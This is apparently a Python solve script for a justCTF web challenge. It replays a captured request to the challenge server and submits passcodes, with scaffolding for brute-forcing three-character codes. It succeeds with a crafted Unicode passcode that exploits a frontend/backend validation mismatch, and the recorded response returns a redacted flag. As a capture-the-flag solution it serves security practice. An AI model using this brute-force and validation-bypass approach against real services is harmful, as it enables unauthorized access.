import burpr
import itertools
import requests

charset = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'
combinations = itertools.product(charset, repeat=3)

def process_passcode(combo):
    PASSCODE = ''.join(combo)
    
    reqs = '''POST /task HTTP/1.1
Host: coms.web.jctf.pro
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://coms.web.jctf.pro/
Content-Type: application/json
Content-Length: 1906
Origin: http://coms.web.jctf.pro
Connection: keep-alive

{"taskData":{"wires":[[389,397.5,439,422.5,606,620.4000244140625,656,645.4000244140625],[391,397.5,441,422.5,257,270.6000061035156,307,295.6000061035156],[388,397.5,438,422.5,350,366,400,391],[389,397.5,439,422.5,223,238.8000030517578,273,263.8000030517578],[389,397.5,439,422.5,160,175.1999969482422,210,200.1999969482422],[387,397.5,437,422.5,321,334.20001220703125,371,359.20001220703125],[391,397.5,441,422.5,638,652.2000122070312,688,677.2000122070312],[385,397.5,435,422.5,389,397.79998779296875,439,422.79998779296875],[389,397.5,439,422.5,510,525,560,550],[391,397.5,441,422.5,134,143.39999389648438,184,168.39999389648438],[388,397.5,438,422.5,576,588.5999755859375,626,613.5999755859375],[392,397.5,442,422.5,288,302.3999938964844,338,327.3999938964844],[388,397.5,438,422.5,71,79.80000305175781,121,104.80000305175781],[389,397.5,439,422.5,35,48,85,73],[387,397.5,437,422.5,543,556.7999877929688,593,581.7999877929688],[385,397.5,435,422.5,478,493.20001220703125,528,518.2000122070312],[389,397.5,439,422.5,416,429.6000061035156,466,454.6000061035156],[386,397.5,436,422.5,100,111.60000610351562,150,136.60000610351562],[387,397.5,437,422.5,197,207,247,232],[384,397.5,434,422.5,447,461.3999938964844,497,486.3999938964844]],"ships":[{"ship":"ship0","correct":true},{"ship":"ship0","correct":true},{"ship":"ship0","correct":true},{"ship":"ship0","correct":true},{"ship":"ship0","correct":true},{"ship":"ship0","correct":true},{"ship":"ship0","correct":true},{"ship":"ship0","correct":true},{"ship":"ship0","correct":true},{"ship":"ship0","correct":true},{"ship":"ship0","correct":true},{"ship":"ship0","correct":true},{"ship":"ship0","correct":true},{"ship":"ship0","correct":true},{"ship":"ship0","correct":true},{"ship":"ship0","correct":true},{"ship":"ship0","correct":true},{"ship":"ship0","correct":true},{"ship":"ship0","correct":true},{"ship":"ship0","correct":true}], "passcode":"P4SSCOD3"}}
'''
    reqs = reqs.replace("P4SSCOD3", PASSCODE)
    
    req = burpr.parse_string(reqs, True)
    burpr.prepare(req)
        
    try:
        res = requests.post(url="http://coms.web.jctf.pro/task", headers=req.headers, json=req.body, timeout=1000)
        print(PASSCODE, res.status_code, res.text)
    except Exception as e:
        print(f"Error with passcode {PASSCODE}: {e}")

def main():
    # funny backend / frontend mismatch
    process_passcode("\u2525\u2525\u2525")
    # ┥┥┥ 200 {"success":true,"message":"The ship is now fixed! Thank you for your efforts. Here is your flag: justCTF{XXXX}"}
if __name__ == "__main__":
    main()